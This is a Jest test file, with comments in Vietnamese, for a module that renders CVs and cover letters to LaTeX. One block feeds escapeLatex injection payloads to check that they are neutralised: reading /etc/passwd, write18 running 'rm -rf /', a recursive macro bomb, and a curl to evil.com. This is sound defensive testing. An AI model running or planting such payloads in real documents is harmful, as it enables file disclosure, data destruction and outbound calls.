import {
  escapeLatex,
  renderCoverLetter,
  renderCv,
  slugify,
  type CvContent,
  type Identity,
} from './latex.js';

const identity: Identity = {
  name: 'Nguyen Minh An',
  email: 'minhan@example.com',
  phone: '0900000000',
  location: 'TP. Ho Chi Minh',
  title: 'Senior Frontend Engineer',
};

describe('escapeLatex - chặn thi hành lệnh', () => {
  // File .tex được sinh từ mô tả công việc do người lạ đăng lên, nên đây là
  // ranh giới an toàn chứ không chỉ là chuyện biên dịch.
  test.each([
    ['\\input{/etc/passwd}', 'đọc file hệ thống'],
    ['\\write18{rm -rf /}', 'chạy lệnh shell'],
    ['\\def\\x{\\x\\x}\\x', 'bom đệ quy'],
    ['\\immediate\\write18{curl evil.com}', 'ghi ra ngoài'],
  ])('vô hiệu %s (%s)', (payload) => {
    const output = escapeLatex(payload);
    // Sau khi escape, không còn dấu \ nào đứng trước chữ cái - tức không còn
    // lệnh.
    const withoutEscapes = output.replace(/\\textbackslash\{\}/g, '');
    expect(withoutEscapes).not.toMatch(/\\[a-zA-Z]/);
  });

  test('dấu cách không bị biến đổi', () => {
    // Lỗi thật đã gặp: dùng dấu cách làm placeholder khiến MỌI dấu cách
    // bị đổi thành \textbackslash{}.
    expect(escapeLatex('mot hai ba bon')).toBe('mot hai ba bon');
  });

  test('giữ nguyên tiếng Việt có dấu', () => {
    expect(escapeLatex('Kỹ sư phần mềm cấp cao')).toBe(
      'Kỹ sư phần mềm cấp cao',
    );
  });

  test('escape các ký tự đặc biệt của LaTeX', () => {
    expect(escapeLatex('R&D 50% $2M #1 a_b {x}')).toBe(
      'R\\&D 50\\% \\$2M \\#1 a\\_b \\{x\\}',
    );
  });

  test('escape dấu ngã và mũ', () => {
    expect(escapeLatex('a~b^c')).toBe(
      'a\\textasciitilde{}b\\textasciicircum{}c',
    );
  });

  test('chuỗi rỗng vẫn an toàn', () => {
    expect(escapeLatex('')).toBe('');
  });
});

describe('slugify', () => {
  test('bỏ dấu tiếng Việt và ký tự đặc biệt', () => {
    expect(slugify('FPT Software_Kỹ sư Đầu ngành (React/Next.js)')).toBe(
      'fpt-software-ky-su-dau-nganh-react-next-js',
    );
  });

  test('không để lại gạch ngang ở hai đầu', () => {
    expect(slugify('  --Hello World--  ')).toBe('hello-world');
  });

  test('cắt tối đa 60 ký tự', () => {
    expect(slugify('a'.repeat(200)).length).toBeLessThanOrEqual(60);
  });
});

describe('renderCoverLetter', () => {
  const content = {
    salutation: 'Kính gửi Ban Tuyển dụng FPT Software,',
    opening: 'Với 5 năm kinh nghiệm frontend, tôi xin ứng tuyển vị trí này.',
    bodyParagraphs: ['Tại Tiki tôi dẫn dắt nhóm 4 kỹ sư.'],
    motivation: 'FPT phù hợp định hướng của tôi.',
    closing: 'Cảm ơn anh chị đã dành thời gian.',
  };

  test('cắt lời chào bị lặp ở đầu đoạn mở', () => {
    // Model hay chép lại salutation vào opening, khiến thư có hai lời chào.
    const tex = renderCoverLetter(identity, 'FPT Software', 'Senior FE', {
      ...content,
      opening: `Kính gửi Ban Tuyển dụng FPT Software,\n\n${content.opening}`,
    });
    expect((tex.match(/Kính gửi/g) ?? []).length).toBe(1);
  });

  test('giữ đoạn mở khi nó không phải lời chào', () => {
    const tex = renderCoverLetter(
      identity,
      'FPT Software',
      'Senior FE',
      content,
    );
    expect(tex).toContain('Với 5 năm kinh nghiệm frontend');
  });

  test('nhận dạng lời chào không dấu', () => {
    const tex = renderCoverLetter(identity, 'FPT Software', 'Senior FE', {
      ...content,
      opening: `Kinh gui Ban Tuyen dung,\n\n${content.opening}`,
    });
    expect(tex).not.toContain('Kinh gui Ban Tuyen dung');
  });

  test('escape tên công ty có ký tự đặc biệt', () => {
    const tex = renderCoverLetter(identity, 'A&B Corp 100%', 'Dev', content);
    expect(tex).toContain('A\\&B Corp 100\\%');
  });

  test('khai đúng documentclass cover', () => {
    const tex = renderCoverLetter(identity, 'FPT', 'Dev', content);
    expect(tex).toContain('\\documentclass[11pt,a4paper]{cover}');
  });
});

describe('renderCv', () => {
  const content: CvContent = {
    profileStatement: 'Kỹ sư frontend 5 năm kinh nghiệm.',
    coreCompetencies: ['Xây dựng design system', 'Tối ưu Core Web Vitals'],
    experiences: [
      {
        position: 'Senior Frontend Engineer',
        company: 'Tiki & Co',
        location: 'TP. Ho Chi Minh',
        period: '2022 - 2026',
        bullets: ['Dẫn dắt nhóm 4 kỹ sư.', 'Giảm thời gian tải 60%.'],
      },
    ],
    educations: [
      {
        degree: 'Kỹ sư',
        institution: 'DH Bach Khoa',
        period: '2016-2020',
        detail: '',
      },
    ],
    skillGroups: [{ label: 'Ngôn ngữ', items: ['TypeScript', 'Go'] }],
  };

  test('chèn needspace trước mỗi cventry để chặn lạc tiêu đề', () => {
    expect(renderCv(identity, content)).toContain(
      '\\needspace{5\\baselineskip}',
    );
  });

  test('escape ký tự đặc biệt trong tên công ty', () => {
    expect(renderCv(identity, content)).toContain('Tiki \\& Co');
  });

  test('khai đúng moderncv banking', () => {
    const tex = renderCv(identity, content);
    expect(tex).toContain('\\documentclass[11pt,a4paper,sans]{moderncv}');
    expect(tex).toContain('\\moderncvstyle{banking}');
  });

  test('vẫn chạy khi các mục rỗng', () => {
    const empty: CvContent = {
      ...content,
      experiences: [],
      educations: [],
      skillGroups: [],
    };
    expect(() => renderCv(identity, empty)).not.toThrow();
  });
});
